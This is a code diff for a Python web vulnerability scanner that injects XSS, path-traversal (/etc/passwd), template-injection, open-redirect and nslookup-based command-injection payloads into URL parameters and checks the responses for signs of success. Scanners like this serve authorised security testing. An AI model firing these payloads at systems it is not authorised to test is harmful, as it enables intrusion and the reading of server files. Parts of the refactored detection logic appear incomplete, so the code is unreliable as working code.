@@ -18,6 +18,7 @@ import logging
 from Queue import Queue
 from colorama import *
 from classSQL import *
+from common import *
 
 """
 根据网络上的一些脚本，自己改了一下
@@ -42,13 +43,7 @@ XSS_Rule = {
         "\" onfous=alert(document.domain)\"><\"",
         "\"`'></textarea><audio/onloadstart=confirm`1` src>",
         "\"</script><svg onload=alert`1`>",
-        # "../../../../../../../../../../etc/passwd",
-        # "..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd",
-        # "../../../../../../../../../../etc/passwd%00",
-        #"././././././././././././././././././././././././../../../../../../../../etc/passwd",
-        #";alert(1)//"
-        #"..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd",
-        "\"`'></textarea><audio/onloadstart=confirm`1` src>",
+        # "\"`'></textarea><audio/onloadstart=confirm`1` src>",
     ],
     "lfi": [
         "../../../../../../../../../../etc/passwd",
@@ -217,35 +212,95 @@ def _init_get_url(url_group,rules,inqueue):
                 #             inqueue.put({'action': _url_item + _rule, 'input': None, 'method': 'get', 'regex': _rule, 'headers': headers, 'type': 'lfi'})
 
                 continue
-            url_parse = _url_item.replace('?'+uquery, '')
-            query_dict = dict(urlparse.parse_qsl(uquery))
+            
+            for r_type in rules.keys():
+                pullutioned_urls = Pollution(_url_item, rules[r_type])
+                if r_type == 'cli':
+                    domain = base64.b64encode(_url_item).replace('=', '')
+                    for i in pullutioned_urls:
+                        i['url'] = i['url'].replace('{domain}', domain)
 
-            for rule_item in rules.keys():
-                for _rule in rules[rule_item]:
-                    for parameter_item in query_dict.keys():
-                        tmp_dict = copy.deepcopy(query_dict)
-                        if rule_item == 'cli':
-                            # domain = url_node.netloc.replace(".", "_").replace(":", "_") + "_" + url_node.path.replace("/", "_")
-                            domain = base64.b64encode(url_node.netloc + "/" + url_node.path)
-                            # remove the last = or == in base64 encode
-                            domain = domain.rstrip('=')
-                            _rule = _rule.replace('{domain}', domain)
-                        # if rule_item == "lfi":
+                for i in pullutioned_urls:
+                    i = i['url']
+                    if r_type == 'lfi':
+                        inqueue.put(
+                            {'action':i,
+                            'input':None,
+                            'method':'get',
+                            'regex': "root:x:0", 
+                            'headers': headers, 
+                            'type': 'lfi'}
+                            )
+                    if r_type == 'redirect':
+                        inqueue.put({
+                            'action': i,
+                            'input': None,
+                            'method': 'get',
+                            'regex': 'Valar Morghulis',
+                            'headers': headers,
+                            'type': 'redirect',
+                        })
+                    
+                    if r_type == 'cli':
+                        inqueue.put({
+                            'action': i,
+                            'input': None,
+                            'method': 'get',
+                            'regex': '',
+                            'headers': headers,
+                            'type': 'cli',
+                            })
+                    
+                    if r_type == 'ssti':
+                        inqueue.put({
+                            'action': i,
+                            'input': None,
+                            'method': 'get',
+                            'regex': '3351376549499229720',
+                            'headers': headers,
+                            'type': 'ssti'
+                        })
+                    if r_type == 'xss':
+                        inqueue.put({
+                            'action': i,
+                            'input': None,
+                            'method': 'get',
+                            'regex': '|'.join(rules[r_type])
+                        })
+
+                
+                
 
 
-                        tmp_dict[parameter_item] = _rule
-                        tmp_qs = urllib.unquote(urllib.urlencode(tmp_dict)).replace('+','%20')
+            # url_parse = _url_item.replace('?'+uquery, '')
+            # query_dict = dict(urlparse.parse_qsl(uquery))
+
+            # for rule_item in rules.keys():
+            #     for _rule in rules[rule_item]:
+            #         for parameter_item in query_dict.keys():
+            #             tmp_dict = copy.deepcopy(query_dict)
+            #             if rule_item == 'cli':
+            #                 # domain = url_node.netloc.replace(".", "_").replace(":", "_") + "_" + url_node.path.replace("/", "_")
+            #                 domain = base64.b64encode(url_node.netloc + "/" + url_node.path)
+            #                 # remove the last = or == in base64 encode
+            #                 domain = domain.rstrip('=')
+            #                 _rule = _rule.replace('{domain}', domain)
+            #             # if rule_item == "lfi":
+
+
+            #             tmp_dict[parameter_item] = _rule
+            #             tmp_qs = urllib.unquote(urllib.urlencode(tmp_dict)).replace('+','%20')
                         
-                        if "lfi" == rule_item:
-                            inqueue.put({'action':url_parse+"?"+tmp_qs,'input':None,'method':'get','regex': "root:x:0", 'headers': headers, 'type': 'lfi'})
-                        if 'usr' in _rule:
-                            inqueue.put({'action':url_parse+"?"+tmp_qs,'input':None,'method':'get','regex': _rule, 'headers': headers, 'type': 'usr'})
-                        elif 'nslookup' in _rule:
-                            inqueue.put({'action':url_parse+"?"+tmp_qs,'input':None,'method':'get','regex': _rule, 'headers': headers, 'type': 'cli'})
-                        elif "1357924680" in _rule:
-                            inqueue.put({'action':url_parse+"?"+tmp_qs,'input':None,'method':'get','regex': '3351376549499229720',  'headers': headers, 'type': 'ssti'})
-                        else:
-                            inqueue.put({'action':url_parse+"?"+tmp_qs,'input':None,'method':'get','regex': _rule, 'headers': headers, 'type': 'xss'})
+            #             if "lfi" == rule_item:
+            #                 inqueue.put({'action':url_parse+"?"+tmp_qs,'input':None,'method':'get','regex': "root:x:0", 'headers': headers, 'type': 'lfi'})
+            #             if 'usr' in _rule:
+            #                 inqueue.put({'action':url_parse+"?"+tmp_qs,'input':None,'method':'get','regex': _rule, 'headers': headers, 'type': 'usr'})
+            #             elif 'nslookup' in _rule:
+            #                 inqueue.put({'action':url_parse+"?"+tmp_qs,'input':None,'method':'get','regex': _rule, 'headers': headers, 'type': 'cli'})
+            #             elif "1357924680" in _rule:
+            #                 inqueue.put({'action':url_parse+"?"+tmp_qs,'input':None,'method':'get','regex': '3351376549499229720',  'headers': headers, 'type': 'ssti'})
+            #             else:
+            #                 inqueue.put({'action':url_parse+"?"+tmp_qs,'input':None,'method':'get','regex': _rule, 'headers': headers, 'type': 'xss'})
 
 
 
@@ -312,25 +367,26 @@ class detectXSS(threading.Thread):
                 return _bool
             else:
                 # 如果ssrf或者URL跳转问题，那么允许其跳转
-                if type == 'usr':
+                if type == 'redirect':
                     req = requests.get(url,timeout=TIMEOUT, headers=headers, verify=False, allow_redirects=True)
-                    req_result = "".join(req.content.split('\n'))
-                    if req_result.find('Valar Morghulis') > 0:
-                        _bool=True
-                        logging.info('[*] [ssrf/url redirect] FOUND!!')
-                    return _bool
+                    # req_result = "".join(req.content.split('\n'))
+                    # if req_result.find('Valar Morghulis') > 0:
+                    #     _bool=True
+                    #     logging.info('[*] [ssrf/url redirect] FOUND!!')
+                    # return _bool
 
                 else:
                     req = requests.get(url,timeout=TIMEOUT, headers=headers, verify=False)
             
-            if type == 'cli':
-                return _bool
+            # if type == 'cli':
+            #     return _bool
             if (req.headers["Content-Type"].split(";")[0]  in ["application/json", "text/plain", "application/javascript", "text/json", "text/javascript", "application/x-javascript"]):
                 return _bool
             req_result = ''.join(req.content.split('\n'))
-
-            if req_result.find(_regex) > -1:
+            if re.findall(_regex, req_result):
                 _bool = True
+            # if req_result.find(_regex) > -1:
+            #     _bool = True
             
             # return _bool
             # if "passwd" in _regex:
